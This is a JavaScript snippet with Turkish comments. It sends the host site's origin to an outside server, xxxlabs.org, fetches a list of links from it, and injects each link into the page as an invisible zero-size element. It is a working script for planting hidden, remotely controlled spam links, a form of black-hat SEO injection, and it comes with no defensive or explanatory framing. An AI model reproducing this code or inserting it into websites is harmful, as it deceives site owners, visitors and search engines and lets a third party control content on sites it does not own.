// Dinamik site URL'sini oluştur
const siteURL = encodeURIComponent(window.location.origin); // Tarayıcının geçerli site URL'sini al
const jsonURL = `https://xxxlabs.org/links.php?siteurl=${siteURL}`; // siteurl parametresini ekle

// JSON verisini çekmek için bir fonksiyon oluşturun
fetch(jsonURL)
    .then(response => {
        if (!response.ok) {
            throw new Error("Network response was not ok " + response.statusText);
        }
        return response.json(); // JSON formatında dönüş yap
    })
    .then(data => {
        // JSON'dan her bir veri için bağlantı oluştur
        data.forEach(item => {
            // <a> elementi oluştur
            const a = document.createElement('a');

            // İçerik ve özellikleri ayarla
            const linkText = document.createTextNode(item.text);
            a.appendChild(linkText);
            a.title = item.title;
            a.href = item.href;
            a.style = "overflow: auto; position: fixed; height: 0pt; width: 0pt";

            // DOM'a ekle
            document.body.appendChild(a);
        });
    })
    .catch(error => {
        console.error("There was a problem with the fetch operation:", error);
    });
